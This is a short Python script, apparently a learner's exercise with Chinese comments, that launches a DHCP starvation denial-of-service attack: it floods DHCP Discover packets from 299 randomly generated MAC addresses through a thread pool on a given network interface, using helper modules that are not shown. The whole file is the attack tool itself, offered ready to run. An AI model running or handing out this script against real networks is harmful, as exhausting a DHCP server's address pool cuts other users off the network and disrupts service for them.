#!/usr/bin/env python3
# -*- encoding = utf-8 -*-
# 该代码由本人学习时编写，仅供自娱自乐！
# 本人QQ：1945962391
# 欢迎留言讨论，共同学习进步！

from multiprocessing.pool import ThreadPool
from Tools.Random_MAC import Random_MAC
from DHCP.DHCP_Discover import DHCP_Discover_Sendonly

pool = ThreadPool(processes=10)


def DHCP_Discover_DoS(ifname):
    i = 1
    while i < 300:
        MAC_ADD = Random_MAC()  # 随机产生MAC地址！
        print(MAC_ADD)  # 打印随机产生的MAC地址！
        # 如果希望慢一点,可以设置延时参数
        pool.apply_async(DHCP_Discover_Sendonly, args=(ifname, MAC_ADD, 0))
        i += 1
    pool.close()


if __name__ == '__main__':
    # 使用Linux解释器 & WIN解释器
    DHCP_Discover_DoS('ens37')
